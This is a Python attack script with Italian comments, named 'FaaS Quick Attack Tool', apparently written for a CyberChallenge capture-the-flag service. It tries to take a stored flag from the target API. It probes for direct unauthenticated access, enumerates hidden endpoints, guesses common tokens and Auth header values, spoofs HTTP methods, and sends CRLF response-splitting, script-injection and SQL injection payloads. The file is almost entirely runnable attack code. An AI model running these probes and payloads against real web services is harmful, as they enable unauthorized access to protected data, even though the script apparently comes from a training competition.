import requests
import time
import sys

# Informazioni target
hostname = "faas.challs.cyberchallenge.it"
app_id = "74be5421-b524-4b06-8ada-6c111324454b"
vault_id = "bdc3e1e0-fa24-48fe-9f96-3c5390dbd842"
flag_key = "flag"

base_url = f"http://{hostname}/api"

def test_direct_flag_access():
    """
    Tenta di accedere direttamente alla flag senza autenticazione
    """
    print("[*] Test accesso diretto alla flag...")
    urls = [
        f"{base_url}/get/{app_id}/{flag_key}",
        f"{base_url}/get/{vault_id}/{flag_key}",
        f"{base_url}/set/{app_id}/{flag_key}",
        f"{base_url}/set/{vault_id}/{flag_key}",
        f"{base_url}/raw/{app_id}/{flag_key}",
        f"{base_url}/raw/{vault_id}/{flag_key}",
        f"{base_url}/use/{app_id}/{flag_key}",
        f"{base_url}/use/{vault_id}/{flag_key}",
        f"{base_url}/direct/{app_id}/{flag_key}",
        f"{base_url}/direct/{vault_id}/{flag_key}",
    ]
    
    for url in urls:
        try:
            print(f"[*] Provo: {url}")
            resp = requests.get(url)
            print(f"   --> {resp.status_code}: {resp.text[:100]}")
        except Exception as e:
            print(f"   --> Errore: {str(e)}")

def test_api_enumeration():
    """
    Tenta di enumerare endpoint API nascosti
    """
    print("\n[*] Enumero endpoint API...")
    endpoints = [
        "info", "status", "admin", "debug", "test", 
        "keys", "list", "all", "apps", "vaults",
        "global", "config", "settings", "health",
        "authorize_direct", "backdoor", "dev"
    ]
    
    for endpoint in endpoints:
        try:
            url = f"{base_url}/{endpoint}"
            print(f"[*] Provo: {url}")
            resp = requests.get(url)
            print(f"   --> {resp.status_code}: {resp.text[:100]}")
            
            # Prova anche con app_id e vault_id
            app_url = f"{url}/{app_id}"
            print(f"[*] Provo: {app_url}")
            resp = requests.get(app_url)
            print(f"   --> {resp.status_code}: {resp.text[:100]}")
            
            vault_url = f"{url}/{vault_id}"
            print(f"[*] Provo: {vault_url}")
            resp = requests.get(vault_url)
            print(f"   --> {resp.status_code}: {resp.text[:100]}")
        except Exception as e:
            print(f"   --> Errore: {str(e)}")

def test_common_tokens():
    """
    Tenta di usare token comuni o prevedibili
    """
    print("\n[*] Provo token comuni...")
    common_tokens = [
        "admin", "root", "test", "debug", "guest",
        app_id, vault_id, "00000000-0000-0000-0000-000000000000",
        "11111111-1111-1111-1111-111111111111", "12345678-1234-5678-1234-567812345678"
    ]
    
    # Test come refresh token
    for token in common_tokens:
        try:
            url = f"{base_url}/refresh/{token}"
            print(f"[*] Refresh con: {token}")
            resp = requests.get(url)
            print(f"   --> {resp.status_code}: {resp.text[:100]}")
            
            if resp.status_code == 200:
                print("[!] SUCCESSO con token comune!")
        except Exception as e:
            print(f"   --> Errore: {str(e)}")
    
    # Test come auth header
    for token in common_tokens:
        try:
            url = f"{base_url}/get/{app_id}/{flag_key}"
            headers = {"Auth": token}
            print(f"[*] Auth header con: {token}")
            resp = requests.get(url, headers=headers)
            print(f"   --> {resp.status_code}: {resp.text[:100]}")
            
            if resp.status_code == 200:
                print("[!] SUCCESSO con auth header comune!")
        except Exception as e:
            print(f"   --> Errore: {str(e)}")

def test_method_spoofing():
    """
    Tenta diverse tecniche di method spoofing
    """
    print("\n[*] Test method spoofing...")
    url = f"{base_url}/get/{app_id}/{flag_key}"
    
    methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]
    headers_variations = [
        {"X-HTTP-Method-Override": "GET"},
        {"X-HTTP-Method": "GET"},
        {"X-Method-Override": "GET"},
        {"X-Original-HTTP-Method": "GET"}
    ]
    
    for method in methods:
        for headers in headers_variations:
            try:
                print(f"[*] Method: {method}, Headers: {headers}")
                
                if method == "GET":
                    resp = requests.get(url, headers=headers)
                elif method == "POST":
                    resp = requests.post(url, headers=headers)
                elif method == "PUT":
                    resp = requests.put(url, headers=headers)
                elif method == "DELETE":
                    resp = requests.delete(url, headers=headers)
                elif method == "PATCH":
                    resp = requests.patch(url, headers=headers)
                elif method == "OPTIONS":
                    resp = requests.options(url, headers=headers)
                elif method == "HEAD":
                    resp = requests.head(url, headers=headers)
                    
                print(f"   --> {resp.status_code}")
                if resp.status_code == 200:
                    print(f"   --> Corpo: {resp.text[:100]}")
            except Exception as e:
                print(f"   --> Errore: {str(e)}")

def test_http_response_splitting():
    """
    Tenta HTTP response splitting con caratteri speciali
    """
    print("\n[*] Test HTTP response splitting...")
    payloads = [
        "%0d%0a",
        "%0d%0aAuth: admin",
        "%0d%0aContent-Length: 0",
        "%0d%0aHTTP/1.1 200 OK",
        "%0d%0a%0d%0a<script>alert(1)</script>",
        "%E5%98%8A%E5%98%8Dcontent-type:%20text/html%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E"
    ]
    
    for payload in payloads:
        try:
            url = f"{base_url}/authorize/{app_id}{payload}"
            print(f"[*] Payload: {payload}")
            resp = requests.get(url)
            print(f"   --> {resp.status_code}: {resp.text[:100]}")
        except Exception as e:
            print(f"   --> Errore: {str(e)}")

def test_vault_as_app():
    """
    Prova a usare l'ID del vault come se fosse un'app
    """
    print("\n[*] Test uso dell'ID del vault come app...")
    
    try:
        # Richiedi autorizzazione usando l'ID del vault
        url = f"{base_url}/authorize/{vault_id}"
        print(f"[*] Richiedo autorizzazione per vault come app: {url}")
        resp = requests.get(url)
        print(f"   --> {resp.status_code}: {resp.text[:100]}")
        
        if resp.status_code == 200:
            data = resp.json()
            wait_token = data.get('token')
            print(f"[+] Ottenuto wait token per vault: {wait_token}")
            
            # Controlla l'autorizzazione
            check_url = f"{base_url}/get_refresh/{wait_token}"
            print(f"[*] Verifico autorizzazione: {check_url}")
            
            for i in range(5):
                time.sleep(1)
                resp = requests.get(check_url)
                print(f"   --> {resp.status_code}: {resp.text[:100]}")
                
                if "accepted" in resp.text:
                    refresh_token = resp.json().get('token')
                    print(f"[+] Ottenuto refresh token: {refresh_token}")
                    
                    # Ottieni auth token
                    auth_url = f"{base_url}/refresh/{refresh_token}"
                    resp = requests.get(auth_url)
                    print(f"   --> {resp.status_code}: {resp.text[:100]}")
                    
                    if resp.status_code == 200:
                        auth_token = resp.json().get('token')
                        print(f"[+] Ottenuto auth token: {auth_token}")
                        
                        # Prova ad accedere alla flag
                        flag_url = f"{base_url}/get/{vault_id}/{flag_key}"
                        headers = {"Auth": auth_token}
                        resp = requests.get(flag_url, headers=headers)
                        print(f"   --> {resp.status_code}: {resp.text[:100]}")
                    break
    except Exception as e:
        print(f"   --> Errore: {str(e)}")

def test_sql_injection():
    """
    Testa semplici payload SQL injection
    """
    print("\n[*] Test SQL injection...")
    payloads = [
        "' OR '1'='1",
        "' OR 1=1 --",
        "' OR 'x'='x",
        "1' OR '1'='1",
        "1 OR 1=1",
        "' OR 1=1/*",
        "') OR ('1'='1",
        "1)) OR ((1=1"
    ]
    
    for payload in payloads:
        try:
            # Prova nell'app_id
            url = f"{base_url}/get/{payload}/{flag_key}"
            print(f"[*] App ID payload: {payload}")
            resp = requests.get(url)
            print(f"   --> {resp.status_code}: {resp.text[:100]}")
            
            # Prova nella chiave
            url = f"{base_url}/get/{app_id}/{payload}"
            print(f"[*] Key payload: {payload}")
            resp = requests.get(url)
            print(f"   --> {resp.status_code}: {resp.text[:100]}")
            
            # Prova nell'header Auth
            url = f"{base_url}/get/{app_id}/{flag_key}"
            headers = {"Auth": payload}
            print(f"[*] Auth header payload: {payload}")
            resp = requests.get(url, headers=headers)
            print(f"   --> {resp.status_code}: {resp.text[:100]}")
        except Exception as e:
            print(f"   --> Errore: {str(e)}")

def main():
    print("===== FaaS Quick Attack Tool =====")
    print(f"Target: {hostname}")
    print(f"App ID: {app_id}")
    print(f"Vault ID: {vault_id}")
    print(f"Flag Key: {flag_key}")
    print("=================================")
    
    # Esegui tutti i test
    test_direct_flag_access()
    test_vault_as_app()
    test_api_enumeration()
    test_common_tokens()
    test_method_spoofing()
    test_http_response_splitting()
    test_sql_injection()
    
    print("\n[*] Test completati")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Programma interrotto dall'utente")
    except Exception as e:
        print(f"\n[!] Errore non gestito: {str(e)}")
        import traceback
        traceback.print_exc() 